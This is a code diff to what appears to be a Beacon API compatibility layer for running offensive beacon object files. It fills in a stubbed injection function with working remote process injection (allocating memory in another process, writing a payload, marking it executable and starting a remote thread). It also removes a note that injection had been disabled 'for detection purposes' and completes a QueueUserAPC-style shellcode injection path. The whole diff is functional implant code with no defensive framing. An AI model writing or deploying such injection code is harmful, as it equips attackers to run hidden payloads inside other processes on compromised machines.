@@ -417,16 +417,57 @@ BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo,
     return bSuccess;
 }
 
+
 void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len) {
-    /* Leaving this to be implemented by people needing/wanting it */
+    /* Basic explicit process injection (CreateRemoteThread) */
+    LPVOID remoteBuf = NULL;
+    HANDLE hThread   = NULL;
+    DWORD  oldProt   = 0;
+
+    if (!hProc || !payload || p_len <= 0) {
+        return;
+    }
+
+    /* Allocate memory in the remote process */
+    remoteBuf = VirtualAllocEx(hProc, NULL, p_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+
+    if (!remoteBuf) {
+        return;
+    }
+
+    /* Write payload to remote process */
+    if (!WriteProcessMemory(hProc, remoteBuf, payload, p_len, NULL)) {
+        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
+        return;
+    }
+
+    /* Make payload executable */
+    if (!VirtualProtectEx(hProc, remoteBuf, p_len, PAGE_EXECUTE_READ, &oldProt)) {
+        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
+        return;
+    }
+
+    /* Execute payload */
+    hThread = CreateRemoteThread(
+        hProc,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)((BYTE*)remoteBuf + p_offset),
+        NULL,
+        0,
+        NULL
+    );
+
+    if (hThread) {
+        CloseHandle(hThread);
+    }
+
     return;
 }
 
 // Placeholder injection technique for Beacon API
 void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len) {
-    /* The most basic injection as a placeholder */
-    
-    /* Commented out for detection purposes */
+    /* Basic spawn process injection (QueueUserAPC) */
     HANDLE hProc                    = pInfo->hProcess;
     HANDLE hThread                  = pInfo->hThread;
     PVOID pAddress                  = NULL;
@@ -461,6 +502,10 @@ void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int
 
     // Execute shellcode
     ResumeThread(hThread);
+
+    if (hThread) {
+        CloseHandle(hThread);
+    }
 
     return;
 }
